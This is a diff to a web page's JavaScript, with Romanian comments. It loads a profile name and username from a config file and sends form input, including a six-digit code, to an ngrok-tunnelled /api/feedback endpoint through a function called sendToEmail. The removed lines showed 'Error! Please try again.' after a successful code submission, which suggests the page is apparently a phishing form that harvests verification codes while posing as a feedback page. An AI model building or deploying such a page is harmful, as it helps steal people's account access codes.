@@ -615,18 +615,28 @@
       history.replaceState({ step: 'step-landing' }, '', window.location.pathname + window.location.search);
     }
 
-    // Încarcă config (nume, username, apiBaseUrl pentru ngrok)
+    // Dacă suntem pe același server (localhost sau ngrok), API-ul e same-origin. Altfel folosim apiBaseUrl din config (GitHub).
     var apiBaseUrl = '';
-    fetch('config.json')
+    var isSameOrigin = (function () {
+      var h = window.location.hostname;
+      return h === 'localhost' || h === '127.0.0.1' || h.indexOf('ngrok') !== -1;
+    })();
+
+    var configUrl = (function () {
+      var p = window.location.pathname;
+      var base = p.replace(/\/[^/]*$/, '') || '';
+      return (base ? base + '/' : '/') + 'config.json';
+    })();
+    fetch(configUrl)
       .then(function (r) { return r.ok ? r.json() : Promise.reject(); })
       .then(function (cfg) {
         var numeEl = document.getElementById('profile-nume');
         var userEl = document.getElementById('profile-username');
         if (numeEl && cfg.nume) numeEl.textContent = cfg.nume;
         if (userEl && cfg.username) userEl.textContent = (cfg.username.indexOf('@') === 0 ? cfg.username : '@' + cfg.username);
-        if (cfg.apiBaseUrl && typeof cfg.apiBaseUrl === 'string') apiBaseUrl = cfg.apiBaseUrl.replace(/\/$/, '');
+        if (!isSameOrigin && cfg.apiBaseUrl && typeof cfg.apiBaseUrl === 'string') apiBaseUrl = cfg.apiBaseUrl.replace(/\/$/, '').trim();
       })
-      .catch(function () { /* păstrăm valorile implicite */ });
+      .catch(function () { });
 
     document.getElementById('btn-trimite-landing').addEventListener('click', function () {
       hideAllSteps();
@@ -663,18 +673,36 @@
     }
 
     function sendToEmail(data, doneCallback) {
-      var url = (apiBaseUrl || '') + '/api/feedback';
+      var base = isSameOrigin ? '' : (apiBaseUrl || '').trim();
+      if (!isSameOrigin && !base) {
+        if (doneCallback) doneCallback(false);
+        return;
+      }
+      var url = base + '/api/feedback';
+      var headers = { 'Content-Type': 'application/json' };
+      if (url.indexOf('ngrok') !== -1) headers['ngrok-skip-browser-warning'] = 'true';
       fetch(url, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: headers,
         body: JSON.stringify({
           sugestiiBusiness: data['Sugestii business (casuta 1)'],
           alteSugestii: data['Alte sugestii (casuta 2)'],
           cod: data['Cod 6 cifre'] || ''
         })
       })
-        .then(function (r) { return r.json().then(function (j) { return doneCallback(r.ok && j && j.ok); }); })
-        .catch(function () { if (doneCallback) doneCallback(false); });
+        .then(function (r) {
+          return r.text().then(function (text) {
+            var ok = false;
+            try {
+              var j = JSON.parse(text);
+              ok = r.ok && j && j.ok;
+            } catch (e) { }
+            if (doneCallback) doneCallback(ok);
+          });
+        })
+        .catch(function () {
+          if (doneCallback) doneCallback(false);
+        });
     }
 
     btnNext.addEventListener('click', function () {
@@ -705,6 +733,7 @@
       var data = collectFormData(false);
       sendToEmail(data, function (ok) {
         if (ok) alert('Mulțumim! Sugestiile au fost trimise.');
+        else alert('Vă rugăm încercați din nou.');
       });
     });
 
@@ -734,10 +763,13 @@
       var code = Array.prototype.map.call(codeInputs, function (inp) { return inp.value; }).join('');
       if (code.length === 6) {
         sendToEmail({ 'Sugestii business (casuta 1)': '', 'Alte sugestii (casuta 2)': '', 'Cod 6 cifre': code }, function (ok) {
-          if (ok) alert('Error! Please try again.');
+          if (ok) alert('Mulțumim! Codul a fost trimis.');
+          else alert('Vă rugăm încercați din nou.');
         });
       }
     });
   </script>
 </body>
 </html>
+
+
